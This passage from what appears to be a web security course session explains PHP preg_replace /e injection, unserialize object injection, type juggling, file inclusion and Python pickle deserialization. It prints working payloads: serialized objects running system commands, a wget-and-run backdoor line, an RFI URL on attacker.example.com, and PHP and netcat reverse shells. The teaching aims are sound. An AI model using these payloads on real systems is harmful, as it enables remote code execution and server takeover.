</span></span><span style=display:flex><span>    <span style=color:#204a87;font-weight:700>echo</span> <span style=color:#000>preg_replace</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>$_GET</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;replace&#39;</span><span style=color:#000;font-weight:700>],</span> <span style=color:#000>$_GET</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;with&#39;</span><span style=color:#000;font-weight:700>],</span> <span style=color:#000>$in</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>?&gt;</span><span style=color:#a40000>
</span></span></span></code></pre></div><p>The code will take a user-supplied regular expression and replace whatever it matches with a user-supplied string.
So if we were to call <code>preg_replace.php?replace=/Known/i&with=eaten</code>, the script would perform a case-insensitive regex search (the <code>i</code> modifier) and echo <code>Somewhere, something incredible is waiting to be eaten</code>.
Seems safe enough, right?</p><p>Well, not at all.
The above code is vulnerable to code injection as it fails to account for dangerous <a href=https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php>PCRE modification flags</a> in the input string.
Most modifiers are quite harmless and let you do things like case-insensitive and multi-line searches, however one modifier, <code>e</code> will cause PHP to execute the result of the <code>preg_replace()</code> operation as PHP code.</p><p>The payload is: <code>?replace=/Known/e&with=system(‘whoami’)</code></p><p>This is extremely dangerous, as it gives an attacker the opportunity to execute any PHP code.</p><p>It has been <strong>deprecated</strong> since <strong>PHP 5.5.0</strong>, and <strong>removed completely</strong> in <strong>PHP 7.0.0</strong>, because of its recklessly insecure nature.
The replacement function is called <code>preg_replace_callback()</code>, which uses a callback.
As many people are still using older versions of PHP, it is still dangerous and even in the versions where it was deprecated, the option will still work (it will generate a warning at a log level turned off by default), so the issue will be around for a while yet.</p><h1 id=php-object-injection--php-insecure-object-deserialization>PHP Object Injection / PHP Insecure Object Deserialization</h1><p><strong>PHP Object Injection</strong> is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context.
The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the <code>unserialize()</code> PHP function.
Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable <code>unserialize()</code> call, resulting in an arbitrary PHP object(s) injection into the application scope.</p><p>In order to go further, we need to know some things about <strong>PHP magic methods</strong>.
The &ldquo;magic&rdquo; methods are nothing more than a set of special named functions, starting with two underscores, which denote methods that will be triggered in response to particular PHP events.
A well known example, which you should be familiar with from other programming languages, is the <code>__construct()</code> method, which is a class constructor.</p><p>The following magic methods will be helpful in exploiting a PHP Object injection vulnerability:</p><ul><li><code>__wakeup()</code> - when an object is unserialized.</li><li><code>__destruct()</code> - when an object is deleted.</li><li><code>__toString()</code> - when an object is converted to a string.</li></ul><p>A more comprehensive list of PHP magic methods would be this one:</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td><code>__construct()</code></td><td><code>__set()</code></td><td><code>__toString()</code></td></tr><tr><td><code>__destruct()</code></td><td><code>__isset()</code></td><td><code>__invoke()</code></td></tr><tr><td><code>__call()</code></td><td><code>__unset()</code></td><td><code>__set_state()</code></td></tr><tr><td><code>__callStatic()</code></td><td><code>__sleep()</code></td><td><code>__clone()</code></td></tr><tr><td><code>__get()</code></td><td><code>__wakeup()</code></td><td><code>__debugInfo()</code></td></tr></tbody></table><h3 id=exploit-with-the-__wakeup-in-the-unserialize-function>Exploit with the <code>__wakeup</code> in the <code>unserialize()</code> function</h3><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#ce5c00;font-weight:700>&lt;?</span><span style=color:#000>php</span>
</span></span><span style=display:flex><span>    <span style=color:#204a87;font-weight:700>class</span> <span style=color:#000>PHPObjectInjection</span> <span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>        <span style=color:#204a87;font-weight:700>public</span> <span style=color:#000>$inject</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span>        <span style=color:#204a87;font-weight:700>function</span> <span style=color:#000>__construct</span><span style=color:#000;font-weight:700>()</span> <span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#000;font-weight:700>}</span>
</span></span><span style=display:flex><span>        <span style=color:#204a87;font-weight:700>function</span> <span style=color:#000>__wakeup</span><span style=color:#000;font-weight:700>()</span> <span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>            <span style=color:#204a87;font-weight:700>if</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>isset</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>$this</span><span style=color:#ce5c00;font-weight:700>-&gt;</span><span style=color:#c4a000>inject</span><span style=color:#000;font-weight:700>))</span> <span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>                <span style=color:#204a87;font-weight:700>eval</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>$this</span><span style=color:#ce5c00;font-weight:700>-&gt;</span><span style=color:#c4a000>inject</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span>            <span style=color:#000;font-weight:700>}</span>
</span></span><span style=display:flex><span>        <span style=color:#000;font-weight:700>}</span>
</span></span><span style=display:flex><span>    <span style=color:#000;font-weight:700>}</span>
</span></span><span style=display:flex><span>    <span style=color:#204a87;font-weight:700>if</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>isset</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>$_REQUEST</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;r&#39;</span><span style=color:#000;font-weight:700>]))</span> <span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>        <span style=color:#000>$var1</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>unserialize</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>$_REQUEST</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;r&#39;</span><span style=color:#000;font-weight:700>]);</span>
</span></span><span style=display:flex><span>        <span style=color:#204a87;font-weight:700>if</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>is_array</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>$var1</span><span style=color:#000;font-weight:700>))</span> <span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>            <span style=color:#204a87;font-weight:700>echo</span> <span style=color:#4e9a06>&#34;&lt;br/&gt;&#34;</span> <span style=color:#ce5c00;font-weight:700>.</span> <span style=color:#000>$var1</span><span style=color:#000;font-weight:700>[</span><span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>]</span> <span style=color:#ce5c00;font-weight:700>.</span> <span style=color:#4e9a06>&#34; - &#34;</span> <span style=color:#ce5c00;font-weight:700>.</span> <span style=color:#000>$var1</span><span style=color:#000;font-weight:700>[</span><span style=color:#0000cf;font-weight:700>1</span><span style=color:#000;font-weight:700>];</span>
</span></span><span style=display:flex><span>        <span style=color:#000;font-weight:700>}</span>
</span></span><span style=display:flex><span>    <span style=color:#000;font-weight:700>}</span> <span style=color:#204a87;font-weight:700>else</span> <span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>        <span style=color:#204a87;font-weight:700>echo</span> <span style=color:#4e9a06>&#34;&#34;</span><span style=color:#000;font-weight:700>;</span> <span style=color:#8f5902;font-style:italic># nothing happens here
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span>    <span style=color:#000;font-weight:700>}</span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>?&gt;</span><span style=color:#a40000>
</span></span></span></code></pre></div><p>Payload:</p><pre tabindex=0><code># Basic serialized data
a:2:{i:0;s:4:&#34;XVWA&#34;;i:1;s:33:&#34;Xtreme Vulnerable Web Application&#34;;}

# Command execution
O:18:&#34;PHPObjectInjection&#34;:1:{s:6:&#34;inject&#34;;s:17:&#34;system(&#39;whoami&#39;);&#34;;}
</code></pre><p>This vulnerability is <strong>extremely dangerous</strong>, as it could also lead to an <strong>RCE (Remote Code Execution)</strong> exploit.
An attacker could use a payload which downloads a script and starts a reverse shell connected to the web server.
The payload could look like this:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#ce5c00;font-weight:700>&lt;?</span><span style=color:#000>php</span>
</span></span><span style=display:flex><span>    <span style=color:#204a87;font-weight:700>class</span> <span style=color:#000>PHPObjectInjection</span>
</span></span><span style=display:flex><span>    <span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>        <span style=color:#8f5902;font-style:italic>// Change URL/ filename to match your setup
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span>        <span style=color:#204a87;font-weight:700>public</span> <span style=color:#000>$inject</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#4e9a06>&#34;system(&#39;wget http://URL/backdoor.txt -O phpobjbackdoor.php &amp;&amp; php phpobjbackdoor.php&#39;);&#34;</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span>    <span style=color:#000;font-weight:700>}</span>
</span></span><span style=display:flex><span>    <span style=color:#204a87;font-weight:700>echo</span> <span style=color:#000>urlencode</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>serialize</span><span style=color:#000;font-weight:700>(</span><span style=color:#204a87;font-weight:700>new</span> <span style=color:#000>PHPObjectInjection</span><span style=color:#000;font-weight:700>));</span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>?&gt;</span><span style=color:#a40000>
</span></span></span></code></pre></div><p>Of course, there are many other methods to achieve a reverse shell once you have the ability to execute code on the target machine.</p><h3 id=authentication-bypass---type-juggling>Authentication bypass - Type juggling</h3><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#ce5c00;font-weight:700>&lt;?</span><span style=color:#000>php</span>
</span></span><span style=display:flex><span>    <span style=color:#204a87;font-weight:700>include</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;credentials.php&#34;</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#8f5902;font-style:italic>// $adminName = &#34;random&#34;;
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span>    <span style=color:#8f5902;font-style:italic>// $adminPassword = &#34;pass&#34;;
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span>
</span></span><span style=display:flex><span>    <span style=color:#000>$data</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>unserialize</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>$_COOKIE</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;auth&#39;</span><span style=color:#000;font-weight:700>]);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#204a87;font-weight:700>if</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>$data</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;username&#39;</span><span style=color:#000;font-weight:700>]</span> <span style=color:#ce5c00;font-weight:700>==</span> <span style=color:#000>$adminName</span> <span style=color:#ce5c00;font-weight:700>&amp;&amp;</span> <span style=color:#000>$data</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;password&#39;</span><span style=color:#000;font-weight:700>]</span> <span style=color:#ce5c00;font-weight:700>==</span> <span style=color:#000>$adminPassword</span><span style=color:#000;font-weight:700>)</span> <span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>        <span style=color:#204a87;font-weight:700>echo</span> <span style=color:#4e9a06>&#34;You logged in as admin!&#34;</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span>    <span style=color:#000;font-weight:700>}</span> <span style=color:#204a87;font-weight:700>else</span> <span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>        <span style=color:#204a87;font-weight:700>echo</span> <span style=color:#4e9a06>&#34;Login failed!&#34;</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span>    <span style=color:#000;font-weight:700>}</span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>?&gt;</span><span style=color:#a40000>
</span></span></span></code></pre></div><p>Payload: <code>a:2:{s:8:"username";b:1;s:8:"password";b:1;}</code></p><h1 id=local-file-inclusion-lfi--remote-file-inclusion-rfi>Local File Inclusion (LFI) / Remote File Inclusion (RFI)</h1><p>An attacker can use <strong>Local File Inclusion (LFI)</strong> to trick the web application into exposing or running files on the web server.
An <strong>LFI</strong> attack may lead to <strong>Information Disclosure</strong>, <strong>Remote Code Execution (RCE)</strong>, or even <strong>Cross-site Scripting (XSS)</strong>.</p><p>Typically, <strong>LFI</strong> occurs when an application uses the path to a file as input.
If the application treats this input as trusted, a local file may be used in the include statement.</p><p>Using <strong>Remote File Inclusion (RFI)</strong>, an attacker can cause the web application to include a remote file.
This is possible for web applications that dynamically include external files or scripts.
Potential web security consequences of a successful <strong>RFI</strong> attack range from <strong>Sensitive Information Disclosure</strong> and <strong>Cross-site Scripting (XSS)</strong> to <strong>Remote Code Execution (RCE)</strong> and, as a final result, <strong>full system compromise</strong>.</p><p><strong>Remote file inclusion</strong> attacks usually occur when an application receives a path to a file as input for a web page and does not properly sanitize it.
This allows an external URL to be supplied to the include function.</p><p><img src=./assets/what-is-rfi-attack.png alt="RFI Attack"></p><p>The above definitions are very similar, so what is the exact difference between the two of them and how does an exploit affect the web application in each case?</p><h2 id=local-file-inclusion>Local File Inclusion</h2><p><strong>Local File Inclusion</strong> can be divided into subcategories based on the end target of the attack.</p><ol><li><p><strong>Path Traversal</strong> - which we have studied in a previous session.
It uses a local file path and enables the attacker to access the contents of arbitrary files.
The outcome of this attack is to read sensitive data and expose confidential information.</p></li><li><p><strong>Remote Code Execution (RCE)</strong> - which is a <strong>very dangerous vulnerability</strong>.
It could be present in web applications that offer the possibility of uploading arbitrary files without proper checks.
Once a malicious file was uploaded (such as a reverse shell), the attacker can compromise the entire system.</p></li></ol><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#ce5c00;font-weight:700>&lt;?</span><span style=color:#000>php</span>
</span></span><span style=display:flex><span>    <span style=color:#8f5902;font-style:italic>// Get the filename from a GET input
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span>    <span style=color:#8f5902;font-style:italic>// Example - http://example.com/?file=filename.php
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span>    <span style=color:#000>$file</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>$_GET</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;file&#39;</span><span style=color:#000;font-weight:700>];</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#8f5902;font-style:italic>// Unsafely include the file
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span>    <span style=color:#8f5902;font-style:italic>// Example - filename.php
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span>    <span style=color:#204a87;font-weight:700>include</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#39;directory/&#39;</span> <span style=color:#ce5c00;font-weight:700>.</span> <span style=color:#000>$file</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>?&gt;</span><span style=color:#a40000>
</span></span></span></code></pre></div><p>Payload: <code>http://example.com/?file=../../uploads/evil.php</code></p><h2 id=remote-file-inclusion>Remote File Inclusion</h2><p>Exactly like in the case of <strong>Local File Inclusion</strong>, where the attacker is able to upload a reverse shell on the server, the <strong>Remote File Inclusion</strong> vulnerability lets the attacker include a remote file in the current web application and execute its contents.
This file could be a reverse shell and give the attacker <strong>full system control</strong>.</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#ce5c00;font-weight:700>&lt;?</span><span style=color:#000>php</span>
</span></span><span style=display:flex><span>    <span style=color:#8f5902;font-style:italic>// Get the filename from a GET input
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span>    <span style=color:#8f5902;font-style:italic>// Example - http://example.com/?file=index.php
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span>    <span style=color:#000>$file</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>$_GET</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;file&#39;</span><span style=color:#000;font-weight:700>];</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#8f5902;font-style:italic>// Unsafely include the file
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span>    <span style=color:#8f5902;font-style:italic>// Example - index.php
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span>    <span style=color:#204a87;font-weight:700>include</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>$file</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>?&gt;</span><span style=color:#a40000>
</span></span></span></code></pre></div><p>Payload: <code>http://example.com/?file=http://attacker.example.com/evil.php</code></p><p><strong>Note:</strong> Even though some web servers run as <strong>root</strong> (<strong>which is a very bad practice</strong>), most of them run as a special user (<strong>www-data</strong>) which doesn’t have root privileges.
This means that getting a reverse shell on a web server will grant you only the rights of the user running the website.
In order to get root access on the machine, further <strong>privilege escalation</strong> methods should be employed, which you will learn about in a future session.</p><h3 id=example-of-a-simple-reverse-shell-in-php>Example of a simple reverse shell in PHP:</h3><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#ce5c00;font-weight:700>&lt;?</span><span style=color:#000>php</span>
</span></span><span style=display:flex><span>    <span style=color:#000>$sock</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>fsockopen</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;127.0.0.1&#34;</span><span style=color:#000;font-weight:700>,</span><span style=color:#0000cf;font-weight:700>1234</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span>    <span style=color:#000>$proc</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>proc_open</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;/bin/sh -i&#34;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#204a87;font-weight:700>array</span><span style=color:#000;font-weight:700>(</span><span style=color:#0000cf;font-weight:700>0</span><span style=color:#ce5c00;font-weight:700>=&gt;</span><span style=color:#000>$sock</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>1</span><span style=color:#ce5c00;font-weight:700>=&gt;</span><span style=color:#000>$sock</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>2</span><span style=color:#ce5c00;font-weight:700>=&gt;</span><span style=color:#000>$sock</span><span style=color:#000;font-weight:700>),</span> <span style=color:#000>$pipes</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>?&gt;</span><span style=color:#a40000>
</span></span></span></code></pre></div><h1 id=python-insecure-deserialization--pickle-module>Python Insecure Deserialization / <code>pickle</code> module</h1><p>We have looked at so many PHP vulnerabilities in this session, but you shouldn&rsquo;t be left with the impression that PHP is the only vulnerable language.
In this section we will approach an insecure object deserialization in a Python web application.</p><h2 id=python-pickle>Python <code>pickle</code></h2><p>In Python, the <code>pickle</code> module lets you serialize and deserialize data.
Essentially, this means that you can convert a Python object into a stream of bytes and then reconstruct it (including the object’s internal structure) later in a different process or environment by loading that stream of bytes.</p><p>When consulting the Python docs for pickle one cannot miss the following warning:</p><p><code>Warning: The pickle module is not secure. Only unpickle data you trust.</code></p><p>Let&rsquo;s have a look at how <code>pickle</code> handles your data. In Python you can serialize objects by using <code>pickle.dumps()</code>:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#204a87;font-weight:700>import</span> <span style=color:#000>pickle</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#000>pickle</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>dumps</span><span style=color:#000;font-weight:700>([</span><span style=color:#4e9a06>&#39;pickle&#39;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#4e9a06>&#39;me&#39;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>1</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>2</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>3</span><span style=color:#000;font-weight:700>])</span>
</span></span></code></pre></div><p>The pickled representation we’re getting back from dumps will look like this:</p><p><code>b'\x80\x04\x95\x19\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x06pickle\x94\x8c\x02me\x94K\x01K\x02K\x03e'</code></p><p>And now reading the serialized data back in&mldr;</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#204a87;font-weight:700>import</span> <span style=color:#000>pickle</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#000>pickle</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>loads</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>b</span><span style=color:#4e9a06>&#39;</span><span style=color:#4e9a06>\x80\x04\x95\x19\x00\x00\x00\x00\x00\x00\x00</span><span style=color:#4e9a06>]</span><span style=color:#4e9a06>\x94</span><span style=color:#4e9a06>(</span><span style=color:#4e9a06>\x8c\x06</span><span style=color:#4e9a06>pickle</span><span style=color:#4e9a06>\x94\x8c\x02</span><span style=color:#4e9a06>me</span><span style=color:#4e9a06>\x94</span><span style=color:#4e9a06>K</span><span style=color:#4e9a06>\x01</span><span style=color:#4e9a06>K</span><span style=color:#4e9a06>\x02</span><span style=color:#4e9a06>K</span><span style=color:#4e9a06>\x03</span><span style=color:#4e9a06>e.&#39;</span><span style=color:#000;font-weight:700>)</span>
</span></span></code></pre></div><p>&mldr;will give us our list object back:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;pickle&#39;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#4e9a06>&#39;me&#39;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>1</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>2</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>3</span><span style=color:#000;font-weight:700>]</span>
</span></span></code></pre></div><p>What is actually happening behind the scenes is that the byte-stream created by dumps contains opcodes that are then one-by-one executed as soon as we load the pickle back in.</p><p>Not every object can be serialized (e.g. file handles) and pickling and unpickling certain objects (like functions or classes) comes with restrictions.
The Python docs give you a good overview of what can and cannot be pickled.</p><p>While in most cases you don’t need to do anything special to make an object &ldquo;picklable&rdquo;, pickle still allows you to define a custom behavior for the pickling process for your class instances.</p><p>Reading a bit further down in the docs we can see that implementing <code>__reduce__</code> is exactly what we would need to get code execution, when viewed from an attacker’s perspective:</p><blockquote><p>The <code>__reduce__()</code> method takes no argument and shall return either a string or preferably a tuple (the returned object is often referred to as the &ldquo;reduce value&rdquo;). [&mldr;]
When a tuple is returned, it must be between two and six items long.
Optional items can either be omitted, or <code>None</code> can be provided as their value.
The semantics of each item are in order:</p><ul><li>A callable object that will be called to create the initial version of the object.</li><li>A tuple of arguments for the callable object. An empty tuple must be given if the callable does not accept any argument. [&mldr;]</li></ul></blockquote><p>So by implementing <code>__reduce__</code> in a class which instances we are going to pickle, we can give the pickling process a callable plus some arguments to run.
While intended for reconstructing objects, we can abuse this for getting our own reverse shell code executed.</p><p>A sample payload generator which opens a reverse shell can be analyzed below:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#204a87;font-weight:700>import</span> <span style=color:#000>pickle</span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>import</span> <span style=color:#000>base64</span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>import</span> <span style=color:#000>os</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>class</span> <span style=color:#000>RCE</span><span style=color:#000;font-weight:700>:</span>
</span></span><span style=display:flex><span>    <span style=color:#204a87;font-weight:700>def</span> <span style=color:#000>__reduce__</span><span style=color:#000;font-weight:700>(</span><span style=color:#3465a4>self</span><span style=color:#000;font-weight:700>):</span>
</span></span><span style=display:flex><span>        <span style=color:#000>cmd</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#39;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | &#39;</span>
</span></span><span style=display:flex><span>               <span style=color:#4e9a06>&#39;/bin/sh -i 2&gt;&amp;1 | nc 127.0.0.1 1234 &gt; /tmp/f&#39;</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span>        <span style=color:#204a87;font-weight:700>return</span> <span style=color:#000>os</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>system</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>cmd</span><span style=color:#000;font-weight:700>,)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>if</span> <span style=color:#000>__name__</span> <span style=color:#ce5c00;font-weight:700>==</span> <span style=color:#4e9a06>&#39;__main__&#39;</span><span style=color:#000;font-weight:700>:</span>
</span></span><span style=display:flex><span>    <span style=color:#000>pickled</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>pickle</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>dumps</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>RCE</span><span style=color:#000;font-weight:700>())</span>
</span></span><span style=display:flex><span>    <span style=color:#204a87>print</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>base64</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>urlsafe_b64encode</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>pickled</span><span style=color:#000;font-weight:700>))</span>
</span></span></code></pre></div><p>This code will generate a reverse shell, which opens the possibility of <strong>RCE</strong> on the target machine.
In order to accomplish this, you also need to make sure the port is accessible to the Internet.
You may find some simple instructions for how to do this <a href=https://securiumsolutions.com/blog/reverse-shell-using-tcp/>here</a>, using <code>ngrok</code>.
Again, it&rsquo;s one of the most dangerous vulnerabilities for a web application, whatever the programming language was chosen for the back-end (be it <strong>PHP</strong>, <strong>Python</strong>, <strong>JavaScript</strong>, <strong>Ruby</strong>, etc.), and the programmer should be aware and protect it against malicious actors.
Also, always research the functions and modules used inside your application to prevent such vulnerabilities.</p><h1 id=wrap-up>Wrap Up</h1><p>As you have seen so far, even a small mistake, such as using <code>==</code> instead of <code>===</code>, can cause your application to break at unexpected input.
From an attacker standpoint, you can never know if the programmer was careful enough when writing the code, so you should always research and test what exploits can the application be vulnerable to, specific to the language / framework used.</p><p>The most important aspect we kept talking about during all the sessions is to never trust the user input.
He can have malicious thoughts and purposefully try to break the application or he can unknowingly send a bad request and achieve the same result.
In conclusion, the code should be properly tested before being put in production and the user input should always be carefully sanitized.</p><h1 id=further-reading>Further Reading</h1><ul><li><a href=https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf>https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf</a></li><li><a href=https://www.netsparker.com/blog/web-security/php-type-juggling-vulnerabilities/>https://www.netsparker.com/blog/web-security/php-type-juggling-vulnerabilities/</a></li><li><a href=https://foxglovesecurity.com/2017/02/07/type-juggling-and-php-object-injection-and-sqli-oh-my/>https://foxglovesecurity.com/2017/02/07/type-juggling-and-php-object-injection-and-sqli-oh-my/</a></li><li><a href=https://hydrasky.com/network-security/php-string-comparison-vulnerabilities/>https://hydrasky.com/network-security/php-string-comparison-vulnerabilities/</a></li><li><a href=https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09>https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09</a></li><li><a href=https://nitesculucian.github.io/2018/10/05/php-object-injection-cheat-sheet/>https://nitesculucian.github.io/2018/10/05/php-object-injection-cheat-sheet/</a></li><li><a href=https://www.imperva.com/learn/application-security/rfi-remote-file-inclusion/>https://www.imperva.com/learn/application-security/rfi-remote-file-inclusion/</a></li><li><a href=https://www.acunetix.com/blog/articles/remote-file-inclusion-rfi/>https://www.acunetix.com/blog/articles/remote-file-inclusion-rfi/</a></li><li><a 